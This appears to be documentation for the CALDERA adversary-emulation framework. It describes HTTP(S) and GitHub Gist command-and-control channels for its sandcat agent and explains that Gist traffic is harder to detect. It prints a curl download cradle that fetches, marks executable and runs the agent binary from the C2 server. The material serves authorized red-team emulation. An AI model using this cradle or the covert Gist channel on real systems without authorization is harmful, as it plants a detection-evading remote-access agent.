What is a C2?
===========

## Command and Control Channels

During the course of an operation, agents running on your target network need to communicate back to the CALDERA server in order to fetch actions, submit the results of executed actions and perhaps even exfiltrate data. This communication is often varied and disguised by [adversaries](https://attack.mitre.org/techniques/T1094/) in the wild. In an effort to achieve realistic adversary emulation, CALDERA makes it easy for you to simulate this type of activity on your own network. 
Out-of-the-box, CALDERA and 54ndc47 support two different command and control (C2) channels: communication over standard HTTP(S) and communication over GitHub Gist posts.  

### HTTP Communication

Let’s first start with the HTTP(S) channel, which 54ndc47 runs by default and requires no additional configuration by you. Defenders that are able to listen to standard HTTP traffic (or perhaps break SSL connections on their network perimeter) will be able to identify the agent’s communication back to CALDERA without too much headache. 

### GIST C2 Communication
GIST C2 communication aims to raise the bar of difficulty on detection through network monitoring by having all communication of an operation transpire through a series of private [GitHub GIST posts](https://gist.github.com) that can only be read by someone in control of your GitHub account. Configuration is relatively simple. You need to create a GitHub personal access token [here](https://github.com/settings/tokens), provide the token to the associated C2 [yaml file](https://github.com/mitre/stockpile/blob/master/data/contact/3dbb59fc-905c-4708-a4f2-e30bc9ac2903.yml), and ensure that you have the required GOLANG libraries installed on the box that hosts CALDERA. The golang required libraries are _github.com/google/go-github/github_ and _golang.org/x/oauth2_. (We attempt to install these libraries for you when you run our install script.) 

### How to use an alternative C2 channel

To tell an agent to use GIST posts as a C2 channel, you need to start it with the `-c2 gist` command line option. Addtionally, your download cradle that requests an agent binary from the CALDERA server should include the HTTP header 'c2:GIST' to inform CALDERA to compile the 54ndc47 with your Github Personal Access token and the necessary Golang code. The resulting download cradle will look something like this: 

`agent=$(curl -svkOJ -X POST -H 'file:sandcat.go' -H 'platform:darwin' -H ‘c2:GIST’ http://localhost:8888/file/download 2>&1 | grep -i 'Content-Disposition' | grep -io 'filename=.*' | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null && ./$agent -server http://localhost:8888 -group my_group -v -c2 GIST;`

Please note that the 54ndc47 plugin page will allow you to automatically generate this download cradle and specify what C2 channel you want.